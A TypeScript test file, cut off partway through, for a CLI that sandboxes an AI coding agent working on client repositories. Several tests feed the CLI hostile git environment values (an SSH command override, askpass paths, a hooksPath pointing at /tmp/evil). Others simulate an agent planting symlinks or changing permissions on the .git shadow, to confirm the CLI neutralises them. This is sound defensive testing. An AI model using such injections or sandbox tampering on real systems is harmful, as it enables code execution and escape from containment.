// `acquit run` renders docs/tutorial.md's blocks character for character, assembles a sandbox whose
// only route out is the allowlisting proxy, and never lets a token or a provider key reach argv.

import assert from "node:assert/strict";
import { spawn, spawnSync } from "node:child_process";
import type { ChildProcess } from "node:child_process";
import { chmodSync, existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import type { CommitSha, JobId, OperatorId } from "../../core/src/ids.ts";
import type { JobProjection } from "../../core/src/job.ts";
import { CliError } from "../src/client.ts";
import type { ApiClient } from "../src/client.ts";
import { runDiff } from "../src/diff.ts";
import { agentArgv, changedFiles, cleanupArgs, egressNetworkCreateArgs, ensureEmptyWorkTreeGitShadow, formatDuration, gitCli,
	globalGitIdentity, networkConnectArgs, networkCreateArgs, parseRunArgs, prepareWorkRepo, providerFromEnv, proxyRunArgs, pushWork,
	renderFinished, renderPreparing, renderRunning, runAgentInSandbox, runnerRunArgs, runRun, sandboxNames, seedCommitIdentity, signalGuard,
	submissionCommit } from "../src/run.ts";
import type { DockerPort, GitRun, RunnerPlan, RunOptions, SandboxNames } from "../src/run.ts";
import { PROVIDER_SPECS } from "../src/operator.ts";
import type { Provider } from "../src/operator.ts";
import { existingStateCheckout, hardenedGitEnv, recordedWorkTree, stateGitDir, assertSafeScopedConfig, checkoutGitArgs, gitGuardArgs, unsafeGitConfigKeys, writeWorkTreeMarker } from "../src/gitstate.ts";
import type { JobCheckout } from "../src/gitstate.ts";
import { makeSecretDir, secretGuard, workRepoUrl, writeAskpass } from "../src/workrepo.ts";
import { pushHead, localHead } from "../src/submit.ts";

const frozen = "a41c9e2d6f4b3a2c1d0e9f8a7b6c5d4e3f2a1b0c" as CommitSha;
const workRepo = "acquit-forks/invoice-app-7q2k";
const tokenCanary = "ghs_CANARY_WORK_REPO_TOKEN";
const keyCanary = "sk-ant-CANARY-PROVIDER-KEY";

/** The projection the API answers with for a job funded to HELD and locked to devon-ops. */
function jobView(overrides: Partial<Record<string, unknown>> = {}): JobProjection {
	return {
		id: "job_7Q2K" as JobId, title: "Totals round wrong for 3-decimal currencies", status: "IN_PROGRESS", phase: "READY",
		budget: 40000, deliveryEndsAt: "2026-11-08T10:00:00.000Z",
		contract: { repository: "maya-client/invoice-app", frozenAt: frozen, frozenTests: 48, hiddenTests: 6, protectedPaths: [] },
		bids: { operators: [{ id: "bid_7Q2K", operator: "devon-ops" as OperatorId, handle: "devon-ops", label: "INDEPENDENT",
			price: 40000, eta: 48, agent: "ts-bugfixer", runner: "claude-code", pitch: "Source changes only.", paidReceipts: 0, status: "ACCEPTED" }],
			house: null },
		client: null, lockedTo: "devon-ops" as OperatorId, viewerCanApprove: false, viewerCanDispute: false, dispute: null,
		arbiterNote: null, releaseAuthority: null, refundReason: null, escrow: "HELD", approveUrl: null, ledger: [],
		attempts: { used: 0, left: 3, last: null, reasons: [], history: [], pending: null, failure: null },
		reviewEndsAt: null, pullRequest: null, mergeCommit: null, merge: null, release: null, receipt: null,
		...overrides,
	} as unknown as JobProjection;
}

/** The block docs/tutorial.md prints for the first run. The agent's own lines arrive between the
 * "Running" line and the "Agent finished" line, so the renderer test passes them through. */
const FIRST_RUN = [
	"Preparing sandbox for job_7Q2K",
	"\tFork: acquit-forks/invoice-app-7q2k (scoped token, expires with the job)",
	"\tContainer: acquit/runner-node20 (network: package registry and your model provider only)",
	"Running ts-bugfixer with your Anthropic key",
	"\tReading issue #12",
	"\tReading src/money.ts, tests/totals.test.ts",
	"\tEditing tests/totals.test.ts",
	"\tRunning npm test: 48 passed",
	"Agent finished in 3m 51s",
	"\tChanged files: tests/totals.test.ts (1 line)",
	"\tReview the diff: acquit diff job_7Q2K",
].join("\n");

/** The block docs/tutorial.md prints for the re-run with an instruction. A re-run resets the fork. */
const RERUN = [
	"Preparing sandbox for job_7Q2K",
	"\tFork: acquit-forks/invoice-app-7q2k (reset to frozen commit a41c9e2)",
	"Running ts-bugfixer with your Anthropic key",
	"\tReading src/money.ts",
	"\tEditing src/money.ts",
	"\tRunning npm test: 48 passed",
	"Agent finished in 5m 08s",
	"\tChanged files: src/money.ts (6 lines)",
	"\tReview the diff: acquit diff job_7Q2K",
].join("\n");

function runOptions(overrides: Partial<RunOptions> = {}): RunOptions {
	return { jobId: "job_7Q2K", dir: null, apiUrl: "http://127.0.0.1:4310", token: "session-canary", instruction: null,
		runner: null, command: null, image: "acquit/runner-node20", proxyImage: "acquit/runner-node20", ...overrides };
}

type RecordingGit = GitRun & { readonly calls: { readonly args: readonly string[]; readonly env: NodeJS.ProcessEnv | undefined }[] };

/** A git port that answers the handful of read commands run.ts makes and records every call. A clone
 * gets the one side effect prepareWorkRepo trusts: the `gitdir:` link `--separate-git-dir` writes. */
function fakeGit(answers: { numstat?: string; untracked?: string; head?: string; origin?: string } = {}): RecordingGit {
	const calls: { args: readonly string[]; env: NodeJS.ProcessEnv | undefined }[] = [];
	// The origin a state checkout cloned from the job's work repo carries: the one URL the state
	// policy keeps, and the one the CLI names on every token call.
	const origin = answers.origin ?? workRepoUrl(workRepo);
	const run: GitRun = (args, env) => {
		calls.push({ args: [...args], env });
		const line = args.join(" ");
		if (args.includes("clone") && args.includes("--separate-git-dir")) {
			const at = args.indexOf("--separate-git-dir");
			const gitDir = args[at + 1] ?? null;
			const dir = args.at(-1) ?? "";
			if (gitDir !== null && dir !== "") {
				// The two side effects prepareWorkRepo trusts: the state git directory and the link.
				mkdirSync(gitDir, { recursive: true });
				mkdirSync(dir, { recursive: true });
				writeFileSync(join(dir, ".git"), `gitdir: ${gitDir}\n`);
			}
		}
		if (line.includes("diff --numstat")) return { status: 0, stdout: answers.numstat ?? "", stderr: "" };
		if (line.includes("ls-files")) return { status: 0, stdout: answers.untracked ?? "", stderr: "" };
		if (line.includes("rev-parse HEAD")) return { status: 0, stdout: `${answers.head ?? "b".repeat(40)}\n`, stderr: "" };
		// The scan reads git's resolved config list, so the fake answers with the one entry the CLI's
		// own clone writes there.
		if (line.includes("config --list --show-scope")) return { status: 0, stdout: `local\0remote.origin.url\n${origin}\0`, stderr: "" };
		if (line.includes("config --get-all remote.origin.url")) return { status: 0, stdout: `${origin}\n`, stderr: "" };
		if (line.includes("config user.email")) return { status: 0, stdout: "", stderr: "" };
		return { status: 0, stdout: "", stderr: "" };
	};
	return Object.assign(run, { calls });
}

type RecordingDocker = DockerPort & { readonly calls: readonly string[][]; readonly envs: readonly (NodeJS.ProcessEnv | undefined)[] };

function fakeDocker(options: { code?: number | null; failOn?: (args: readonly string[]) => boolean;
	codeOn?: (args: readonly string[]) => number | null | undefined; output?: string;
	/** Runs when the runner container starts: the place a test plays the agent inside the sandbox. */
	during?: (args: readonly string[]) => void } = {}): RecordingDocker {
	const calls: string[][] = [];
	const envs: (NodeJS.ProcessEnv | undefined)[] = [];
	const run: DockerPort["run"] = async (args, runOptions) => {
		calls.push([...args]);
		envs.push(runOptions?.env);
		if (options.failOn?.(args) === true) throw new CliError("DOCKER_UNAVAILABLE", "docker could not start");
		if (args[0] === "run" && args.includes("--rm") && !args.includes("--detach")) options.during?.(args);
		const forced = options.codeOn?.(args);
		if (forced !== undefined) {
			if (options.output !== undefined) runOptions?.onOutput?.(options.output, "stderr");
			return forced;
		}
		return args[0] === "run" && !args.includes("--detach") ? options.code ?? 0 : 0;
	};
	return { run, calls, envs };
}

/** A real work tree for the sandbox tests: the mount source must exist, and starting the sandbox
 * re-makes its `.git` shadow there, so a fixed path would leak between tests. */
function sandboxWorkTree(t: { after(callback: () => void): void }): string {
	const work = mkdtempSync(join(tmpdir(), "acquit-run-work-"));
	t.after(() => rmSync(work, { recursive: true, force: true }));
	return work;
}

function fakeClient(options: { job?: JobProjection; operatorId?: string; workRepoToken?: string } = {}): ApiClient & { readonly posts: string[] } {
	const posts: string[] = [];
	return {
		baseUrl: "http://127.0.0.1:4310", posts,
		async get(path) { return path === "/api/me/operator" ? { operator: { id: options.operatorId ?? "devon-ops" } } : { job: options.job ?? jobView() }; },
		async post(path) { posts.push(path); return { status: 200, body: { repository: workRepo, token: options.workRepoToken ?? tokenCanary } }; },
	};
}

const keyPort = (key: string | null, provider: Provider = "anthropic", model: string | null = null) =>
	({ async getProvider() { return { provider, model }; }, async getKey() { return key; } });

// ---- argument parsing -------------------------------------------------------------------------

test("run parses its flags, refuses unknown ones, and never takes the session token from argv", () => {
	const options = parseRunArgs(["job_7Q2K", "--instruction", "Fix the rounding in src/money.ts.",
		"--runner", "command", "--command", "/tmp/fix.sh", "--dir", "/tmp/work", "--api", "http://127.0.0.1:4330"],
		{ ACQUIT_TOKEN: "s3cret" });
	assert.deepEqual({ jobId: options.jobId, dir: options.dir, apiUrl: options.apiUrl, token: options.token, instruction: options.instruction,
		runner: options.runner, command: options.command, image: options.image },
		{ jobId: "job_7Q2K", dir: "/tmp/work", apiUrl: "http://127.0.0.1:4330", token: "s3cret",
			instruction: "Fix the rounding in src/money.ts.", runner: "command", command: "/tmp/fix.sh", image: "acquit/runner-node20" });
	assert.throws(() => parseRunArgs(["--nope"], { ACQUIT_TOKEN: "s3cret" }), (error: CliError) => error.code === "USAGE");
	assert.throws(() => parseRunArgs(["job_7Q2K"], {}), (error: CliError) => error.code === "AUTH_REQUIRED" && !error.message.includes("s3cret"));
	assert.throws(() => parseRunArgs([], { ACQUIT_TOKEN: "s3cret" }), (error: CliError) => error.code === "USAGE");
});

test("the session token never comes from argv: --token reads stdin and a value is refused", () => {
	const canary = "canary-token-value";
	assert.throws(() => parseRunArgs(["job_7Q2K", "--token", canary], { ACQUIT_TOKEN: "s3cret" }),
		(error: CliError) => error.code === "TOKEN_ON_ARGV" && !error.message.includes(canary));
	assert.equal(parseRunArgs(["job_7Q2K", "--token"], {}, () => `${canary}\n`).token, canary);
	assert.throws(() => parseRunArgs(["job_7Q2K", "--token"], {}, () => "\n"), (error: CliError) => error.code === "AUTH_REQUIRED");
});

test("run resolves the stored login for its origin and its token", () => {
	const stored = () => ({ api: "http://127.0.0.1:4399", token: "stored-session", handle: "devon-ops", role: "OPERATOR" });
	const options = parseRunArgs(["job_7Q2K"], {}, () => "", stored);
	assert.equal(options.apiUrl, "http://127.0.0.1:4399");
	assert.equal(options.token, "stored-session");
	// The flag and the environment still outrank the file, as they do for submit.
	assert.equal(parseRunArgs(["job_7Q2K", "--api", "http://127.0.0.1:4330"], {}, () => "", stored).apiUrl, "http://127.0.0.1:4330");
	assert.equal(parseRunArgs(["job_7Q2K"], { ACQUIT_API: "http://127.0.0.1:4111" }, () => "", stored).apiUrl, "http://127.0.0.1:4111");
	assert.equal(parseRunArgs(["job_7Q2K"], { ACQUIT_TOKEN: "env-token" }, () => "", stored).token, "env-token");
	assert.throws(() => parseRunArgs(["job_7Q2K"], {}), (error: CliError) => error.code === "AUTH_REQUIRED");
});

test("--runner and --command must agree, and --command alone selects the command runner", () => {
	assert.equal(parseRunArgs(["job_7Q2K", "--command", "/tmp/fix.sh"], { ACQUIT_TOKEN: "s" }).runner, "command");
	assert.equal(parseRunArgs(["job_7Q2K", "--runner", "claude-code"], { ACQUIT_TOKEN: "s" }).runner, "claude-code");
	assert.throws(() => parseRunArgs(["job_7Q2K", "--runner", "codex"], { ACQUIT_TOKEN: "s" }), (error: CliError) => error.code === "USAGE");
	assert.throws(() => parseRunArgs(["job_7Q2K", "--runner", "command"], { ACQUIT_TOKEN: "s" }), (error: CliError) => error.code === "USAGE");
	assert.throws(() => parseRunArgs(["job_7Q2K", "--runner", "claude-code", "--command", "/tmp/fix.sh"], { ACQUIT_TOKEN: "s" }),
		(error: CliError) => error.code === "USAGE");
});

test("the provider default reads ACQUIT_PROVIDER, its model, and ACQUIT_PROVIDER_KEY", async () => {
	const port = providerFromEnv({ ACQUIT_PROVIDER: "openrouter", ACQUIT_PROVIDER_MODEL: "deepseek/deepseek-v4.1-flash",
		ACQUIT_PROVIDER_KEY: keyCanary });
	assert.deepEqual(await port.getProvider(), { provider: "openrouter", model: "deepseek/deepseek-v4.1-flash" });
	assert.equal(await port.getKey(), keyCanary);
	const bare = providerFromEnv({});
	assert.deepEqual(await bare.getProvider(), { provider: "anthropic", model: null });
	assert.equal(await bare.getKey(), null);
});

// ---- output rendering -------------------------------------------------------------------------

test("the first-run preparing block matches docs/tutorial.md character for character", () => {
	assert.equal(renderPreparing({ jobId: "job_7Q2K", workRepo, image: "acquit/runner-node20", frozenAt: frozen, reset: false }), [
		"Preparing sandbox for job_7Q2K",
		"\tFork: acquit-forks/invoice-app-7q2k (scoped token, expires with the job)",
		"\tContainer: acquit/runner-node20 (network: package registry and your model provider only)",
	].join("\n"));
});

test("the re-run preparing block matches docs/tutorial.md character for character", () => {
	assert.equal(renderPreparing({ jobId: "job_7Q2K", workRepo, image: "acquit/runner-node20", frozenAt: frozen, reset: true }), [
		"Preparing sandbox for job_7Q2K",
		"\tFork: acquit-forks/invoice-app-7q2k (reset to frozen commit a41c9e2)",
	].join("\n"));
});

test("the full first-run block matches docs/tutorial.md character for character", () => {
	const block = [
		renderPreparing({ jobId: "job_7Q2K", workRepo, image: "acquit/runner-node20", frozenAt: frozen, reset: false }),
		renderRunning("ts-bugfixer", "claude-code", null),
		["\tReading issue #12", "\tReading src/money.ts, tests/totals.test.ts", "\tEditing tests/totals.test.ts", "\tRunning npm test: 48 passed"].join("\n"),
		renderFinished([{ path: "tests/totals.test.ts", added: 1, binary: false }], 231_000, "job_7Q2K"),
	].join("\n");
	assert.equal(block, FIRST_RUN);
});

test("the full re-run block matches docs/tutorial.md character for character", () => {
	const block = [
		renderPreparing({ jobId: "job_7Q2K", workRepo, image: "acquit/runner-node20", frozenAt: frozen, reset: true }),
		renderRunning("ts-bugfixer", "claude-code", null),
		["\tReading src/money.ts", "\tEditing src/money.ts", "\tRunning npm test: 48 passed"].join("\n"),
		renderFinished([{ path: "src/money.ts", added: 6, binary: false }], 308_000, "job_7Q2K"),
	].join("\n");
	assert.equal(block, RERUN);
});

test("the changed-files block pluralizes lines and says none when nothing changed", () => {
	assert.equal(renderFinished([{ path: "src/money.ts", added: 6, binary: false }], 1_000, "job_7Q2K"), [
		"Agent finished in 1s", "\tChanged files: src/money.ts (6 lines)", "\tReview the diff: acquit diff job_7Q2K",
	].join("\n"));
	assert.equal(renderFinished([], 1_000, "job_7Q2K"), [
		"Agent finished in 1s", "\tChanged files: none", "\tReview the diff: acquit diff job_7Q2K",
	].join("\n"));
});

test("durations render as the tutorial prints them", () => {
	assert.equal(formatDuration(1_000), "1s");
	assert.equal(formatDuration(51_000), "51s");
	assert.equal(formatDuration(231_000), "3m 51s");
	assert.equal(formatDuration(308_000), "5m 08s");
	assert.equal(formatDuration(3_600_000), "1h 00m 00s");
});

test("the command runner prints its script instead of a provider key", () => {
	assert.equal(renderRunning("ts-bugfixer", "command", "/tmp/fix.sh"), "Running ts-bugfixer with the command runner: /tmp/fix.sh");
});

test("the running line names the provider and the model for openrouter", () => {
	assert.equal(renderRunning("ts-bugfixer", "claude-code", null), "Running ts-bugfixer with your Anthropic key");
	assert.equal(renderRunning("ts-bugfixer", "claude-code", null, "openrouter", "deepseek/deepseek-v4.1-flash"),
		"Running ts-bugfixer with your OpenRouter key, model deepseek/deepseek-v4.1-flash");
	// No stored model pins the provider's own default.
	assert.equal(renderRunning("ts-bugfixer", "claude-code", null, "openrouter", null),
		"Running ts-bugfixer with your OpenRouter key, model deepseek/deepseek-v4.1-flash");
});

// ---- changed files ----------------------------------------------------------------------------

test("changed files counts added lines against the frozen commit and untracked files", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-changed-"));
	try {
		const git = gitCli();
		const gitAt = (args: readonly string[]) => {
			const result = git(["-C", root, ...args]);
			assert.equal(result.status, 0, result.stderr);
			return result.stdout.trim();
		};
		gitAt(["init", "--quiet"]);
		gitAt(["config", "user.email", "fixture@example.invalid"]);
		gitAt(["config", "user.name", "fixture"]);
		mkdirSync(join(root, "tests"));
		writeFileSync(join(root, "tests/totals.test.ts"), "it(\"formats\", () => {\n\texpect(1).toBe(1);\n});\n");
		gitAt(["add", "-A"]);
		gitAt(["commit", "--quiet", "-m", "base"]);
		const base = gitAt(["rev-parse", "HEAD"]) as CommitSha;
		writeFileSync(join(root, "tests/totals.test.ts"), "it(\"formats\", () => {\n\texpect(1).toBe(1);\n\texpect(2).toBe(2);\n});\n");
		mkdirSync(join(root, "src"));
		writeFileSync(join(root, "src/new.ts"), "export const a = 1;\nexport const b = 2;\n");
		assert.deepEqual(changedFiles(git, { gitDir: join(root, ".git"), workTree: root }, base, process.env), [
			{ path: "src/new.ts", added: 2, binary: false },
			{ path: "tests/totals.test.ts", added: 1, binary: false },
		]);
	} finally { rmSync(root, { recursive: true, force: true }); }
});

/** The environment a host-side git call on a checkout gets: the CLI's own hardening over the test's
 * env, so a test's push and the scan that guards it read the same config files the CLI's do. The
 * state root is the test's own, so the CLI-owned empty global config lands inside it. */
function hardenedEnv(root: string): NodeJS.ProcessEnv {
	return hardenedGitEnv({ ...process.env, XDG_STATE_HOME: join(root, "state-home") });
}

/** A real bare work repo carrying one frozen commit, plus the seed clone that pushed it. */
function workRepoFixture(root: string): { readonly bare: string; readonly frozen: CommitSha; readonly git: GitRun;
	readonly at: (dir: string, args: readonly string[]) => string } {
	const git = gitCli();
	const at = (dir: string, args: readonly string[]) => {
		const result = git(["-C", dir, ...args]);
		assert.equal(result.status, 0, result.stderr);
		return result.stdout.trim();
	};
	const bare = join(root, "invoice-app-7Q2K.git");
	assert.equal(spawnSync("git", ["init", "--bare", "--quiet", bare]).status, 0);
	const seed = join(root, "seed");
	mkdirSync(seed);
	at(seed, ["init", "--quiet"]);
	at(seed, ["config", "user.email", "fixture@example.invalid"]);
	at(seed, ["config", "user.name", "fixture"]);
	writeFileSync(join(seed, "money.ts"), "const DECIMALS = 2;\n");
	at(seed, ["add", "-A"]);
	at(seed, ["commit", "--quiet", "-m", "frozen"]);
	const frozen = at(seed, ["rev-parse", "HEAD"]) as CommitSha;
	at(seed, ["push", "--quiet", bare, "HEAD:refs/heads/main"]);
	return { bare, frozen, git, at };
}

// ---- the state git directory ------------------------------------------------------------------

test("the job's git directory lives in the CLI's state location, never in the work tree", () => {
	assert.equal(stateGitDir("job_7Q2K", { XDG_STATE_HOME: "/tmp/xdg" }), join("/tmp/xdg", "acquit", "work", "job_7Q2K.git"));
	assert.equal(stateGitDir("job_7Q2K", { HOME: "/tmp/home" }), join("/tmp/home", ".local", "state", "acquit", "work", "job_7Q2K.git"));
	assert.throws(() => stateGitDir("../escape", {}), (error: CliError) => error.code === "USAGE");
	assert.equal(existingStateCheckout("job_7Q2K", "/tmp/work", { XDG_STATE_HOME: "/tmp/absent" }), null);
});

test("the state checkout is used only for the work tree the state git directory records", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-recorded-"));
	try {
		const stateHome = join(root, "state-home");
		const env = { XDG_STATE_HOME: stateHome };
		const state = stateGitDir("job_7Q2K", env);
		mkdirSync(state, { recursive: true });
		const recorded = join(root, "run-checkout");
		const own = join(root, "operator-checkout");
		mkdirSync(recorded);
		mkdirSync(own);
		writeWorkTreeMarker(state, recorded);
		// The --dir the state git directory records: submit and diff read it through that directory.
		assert.deepEqual(existingStateCheckout("job_7Q2K", recorded, env), { gitDir: state, workTree: recorded });
		// A symlink to the recorded work tree names the same checkout.
		const link = join(root, "link");
		symlinkSync(recorded, link);
		assert.deepEqual(existingStateCheckout("job_7Q2K", link, env), { gitDir: state, workTree: link });
		// Any other --dir is the operator's own checkout: discovery, no state git directory.
		assert.equal(existingStateCheckout("job_7Q2K", own, env), null);
		// A state directory that records no work tree belongs to no checkout either.
		const unmarked = stateGitDir("job_NOMARK", env);
		mkdirSync(unmarked, { recursive: true });
		assert.equal(existingStateCheckout("job_NOMARK", recorded, env), null);
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("submit reads the operator's own checkout when the state git directory records another work tree", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-localhead-"));
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const stateHome = join(root, "state-home");
		const state = stateGitDir("job_7Q2K", { XDG_STATE_HOME: stateHome });
		const work = join(root, "work");
		prepareWorkRepo(git, { gitDir: state, workTree: work }, bare, frozen, process.env);
		// The operator's own clone of the same work repo, carrying a newer commit of its own.
		const own = join(root, "own");
		assert.equal(spawnSync("git", ["clone", "--quiet", bare, own], { encoding: "utf8" }).status, 0);
		writeFileSync(join(own, "money.ts"), "const DECIMALS = 3;\n");
		assert.equal(git(["-C", own, "add", "-A"]).status, 0);
		assert.equal(git(["-C", own, "-c", "user.name=operator", "-c", "user.email=operator@example.invalid", "commit", "--quiet", "-m", "own"]).status, 0);
		const ownHead = git(["-C", own, "rev-parse", "HEAD"]).stdout.trim();
		const env = { XDG_STATE_HOME: stateHome };
		assert.equal(localHead(own, "job_7Q2K", env), ownHead);
		// The --dir the state directory records still reads through the state git directory.
		assert.equal(localHead(work, "job_7Q2K", env), frozen);
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("the git child env strips every inherited GIT_* and SSH_ASKPASS and reads no user config", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-gitstate-"));
	try {
		const env = hardenedGitEnv({ PATH: "/usr/bin", XDG_STATE_HOME: root, GIT_DIR: "/tmp/evil", GIT_WORK_TREE: "/tmp/evil",
			GIT_EXEC_PATH: "/tmp/evil", GIT_CONFIG_COUNT: "1", GIT_CONFIG_KEY_0: "core.hooksPath", GIT_CONFIG_VALUE_0: "/tmp/evil",
			GIT_SSH_COMMAND: "evil", GIT_SSH: "/tmp/evil-ssh", GIT_ASKPASS: "/tmp/evil-askpass", SSH_ASKPASS: "/tmp/evil-ssh-askpass" });
		for (const name of ["GIT_DIR", "GIT_WORK_TREE", "GIT_EXEC_PATH", "GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "GIT_CONFIG_VALUE_0",
			"GIT_SSH_COMMAND", "GIT_SSH", "GIT_ASKPASS", "SSH_ASKPASS"]) assert.equal(env[name], undefined, name);
		assert.equal(env.GIT_CONFIG_NOSYSTEM, "1");
		assert.equal(env.GIT_TERMINAL_PROMPT, "0");
		assert.equal(env.GIT_CONFIG_GLOBAL, join(root, "acquit", "gitconfig"));
		assert.equal(readFileSync(env.GIT_CONFIG_GLOBAL!, "utf8"), "");
		assert.equal(statSync(env.GIT_CONFIG_GLOBAL!).mode & 0o777, 0o600);
		assert.equal(statSync(join(root, "acquit", "work")).mode & 0o777, 0o700);
		// Command-line config outranks any local config: hooks, fsmonitor, credentials, ssh, TLS
		// verification, any proxy, and every kind of submodule recursion are all settled before git
		// reads the checkout's own config.
		assert.deepEqual(gitGuardArgs({ XDG_STATE_HOME: root }), ["-c", `core.hooksPath=${join(root, "acquit", "hooks")}`,
			"-c", "core.fsmonitor=false", "-c", "credential.helper=", "-c", "core.sshCommand=",
			"-c", "http.sslVerify=true", "-c", "http.proxy=", "-c", "submodule.recurse=false",
			"-c", "fetch.recurseSubmodules=false", "-c", "push.recurseSubmodules=no"]);
		assert.equal(statSync(join(root, "acquit", "hooks")).isDirectory(), true);
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("preparing the job's checkout keeps the git directory outside the work tree and resets the tree", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-prepare-"));
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const state = stateGitDir("job_7Q2K", { XDG_STATE_HOME: join(root, "state-home") });
		const work = join(root, "work");
		const checkout = { gitDir: state, workTree: work };
		// The CLI's own hardened env: the rerun's fetch carries the scoped token and is scanned first.
		const env = hardenedEnv(root);
		prepareWorkRepo(git, checkout, bare, frozen, env);
		// The commit lives in the state git directory; the work tree carries no git metadata at all.
		assert.equal(git(["--git-dir", state, "--work-tree", work, "rev-parse", "HEAD"]).stdout.trim(), frozen);
		assert.equal(existsSync(join(state, "HEAD")), true);
		assert.equal(readdirSync(join(work, ".git")).length, 0);
		assert.equal(spawnSync("git", ["-C", work, "rev-parse", "HEAD"]).status !== 0, true, "discovery must never find the state gitdir");
		assert.equal(recordedWorkTree(state), work);
		// A rerun fetches and resets the same work tree, dropping whatever the last run left behind.
		writeFileSync(join(work, "money.ts"), "const DECIMALS = 3;\n");
		writeFileSync(join(work, "junk.txt"), "untracked\n");
		// A previous run's agent owns the work tree and can have replaced the shadow with a symlink.
		const outside = join(root, "outside");
		mkdirSync(outside);
		writeFileSync(join(outside, "canary.txt"), "keep\n");
		rmSync(join(work, ".git"), { recursive: true, force: true });
		symlinkSync(outside, join(work, ".git"));
		prepareWorkRepo(git, checkout, bare, frozen, env);
		assert.equal(git(["--git-dir", state, "--work-tree", work, "rev-parse", "HEAD"]).stdout.trim(), frozen);
		assert.equal(existsSync(join(work, "junk.txt")), false);
		assert.equal(readFileSync(join(work, "money.ts"), "utf8"), "const DECIMALS = 2;\n");
		// The planted link is unlinked, the directory it named is untouched, and the shadow the
		// sandbox will mount is empty and real again.
		assert.equal(lstatSync(join(work, ".git")).isSymbolicLink(), false);
		assert.equal(lstatSync(join(work, ".git")).isDirectory(), true);
		assert.deepEqual(readdirSync(join(work, ".git")), []);
		assert.equal(readFileSync(join(outside, "canary.txt"), "utf8"), "keep\n");
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("the sandbox shadow is re-made as an empty real directory whatever a previous run left", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-shadow-function-"));
	const outside = mkdtempSync(join(tmpdir(), "acquit-run-shadow-outside-"));
	try {
		const work = join(root, "work");
		mkdirSync(work);
		// A symlink to a directory outside: unlinking the link itself must never touch the target.
		writeFileSync(join(outside, "canary.txt"), "keep\n");
		symlinkSync(outside, join(work, ".git"));
		ensureEmptyWorkTreeGitShadow(work);
		assert.equal(lstatSync(join(work, ".git")).isSymbolicLink(), false);
		assert.equal(statSync(join(work, ".git")).isDirectory(), true);
		assert.deepEqual(readdirSync(join(work, ".git")), []);
		assert.equal(statSync(join(work, ".git")).mode & 0o777, 0o700);
		assert.equal(readFileSync(join(outside, "canary.txt"), "utf8"), "keep\n");
		// A dangling symlink: `existsSync` would answer false and `statSync` would throw, but the
		// link itself is still there to be removed.
		rmSync(join(work, ".git"), { recursive: true, force: true });
		symlinkSync(join(root, "gone"), join(work, ".git"));
		ensureEmptyWorkTreeGitShadow(work);
		assert.equal(lstatSync(join(work, ".git")).isDirectory(), true);
		// A regular file, the clone's `gitdir:` link, is replaced by the directory.
		rmSync(join(work, ".git"), { recursive: true, force: true });
		writeFileSync(join(work, ".git"), `gitdir: ${join(root, "state")}\n`);
		ensureEmptyWorkTreeGitShadow(work);
		assert.equal(lstatSync(join(work, ".git")).isDirectory(), true);
		// A real directory is emptied entry by entry; a symlink entry is unlinked, not followed.
		writeFileSync(join(work, ".git", "hooks-pre-push"), "#!/bin/sh\nexit 0\n");
		mkdirSync(join(work, ".git", "nested"));
		writeFileSync(join(work, ".git", "nested", "planted.txt"), "x\n");
		symlinkSync(join(outside, "canary.txt"), join(work, ".git", "linked"));
		ensureEmptyWorkTreeGitShadow(work);
		assert.deepEqual(readdirSync(join(work, ".git")), []);
		assert.equal(readFileSync(join(outside, "canary.txt"), "utf8"), "keep\n");
		// A missing shadow is created 0700.
		rmSync(join(work, ".git"), { recursive: true, force: true });
		ensureEmptyWorkTreeGitShadow(work);
		assert.equal(statSync(join(work, ".git")).isDirectory(), true);
		assert.equal(statSync(join(work, ".git")).mode & 0o777, 0o700);
	} finally {
		rmSync(root, { recursive: true, force: true });
		rmSync(outside, { recursive: true, force: true });
	}
});

test("a shadow a previous run chmod'ed is emptied instead of wedging the next run", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-shadow-mode-"));
	try {
		const work = join(root, "work");
		mkdirSync(work);
		// An agent can leave the shadow unreadable (mode 000) or unwritable (mode 0500); the CLI owns
		// the work tree, so it re-permissions the directory before it reads or empties it.
		for (const mode of [0o000, 0o500]) {
			mkdirSync(join(work, ".git"));
			writeFileSync(join(work, ".git", "planted.txt"), "left by the agent\n");
			chmodSync(join(work, ".git"), mode);
			ensureEmptyWorkTreeGitShadow(work);
			assert.deepEqual(readdirSync(join(work, ".git")), [], `mode ${mode.toString(8)}`);
			assert.equal(statSync(join(work, ".git")).mode & 0o777, 0o700, `mode ${mode.toString(8)}`);
			rmSync(join(work, ".git"), { recursive: true, force: true });
		}
		// A work tree the CLI cannot write is a named refusal, not a raw EACCES stack.
		const locked = join(root, "locked");
		mkdirSync(locked);
		chmodSync(locked, 0o500);
		try {
			assert.throws(() => ensureEmptyWorkTreeGitShadow(locked),
				(error: CliError) => error.code === "SHADOW_NOT_USABLE" && error.message.includes(join(locked, ".git")));
		} finally { chmodSync(locked, 0o700); }
	} finally {
		for (const path of [join(root, "work", ".git"), join(root, "locked")]) {
			try { chmodSync(path, 0o700); } catch { /* the shadow was removed, or is already usable */ }
		}
		rmSync(root, { recursive: true, force: true });
	}
});

test("a non-empty --dir without a state git directory is refused with the fresh-dir hint", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-dir-"));
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const state = stateGitDir("job_7Q2K", { XDG_STATE_HOME: join(root, "state-home") });
		writeFileSync(join(root, "notes.txt"), "not a repository\n");
		assert.throws(() => prepareWorkRepo(git, { gitDir: state, workTree: root }, bare, frozen, process.env),
			(error: CliError) => error.code === "DIR_NOT_WORK_REPO" && error.message.includes("fresh --dir"));
		// An older build's in-tree checkout is exactly this case: its .git cannot become the state gitdir.
		const old = join(root, "old");
		assert.equal(spawnSync("git", ["clone", "--quiet", bare, old]).status, 0);
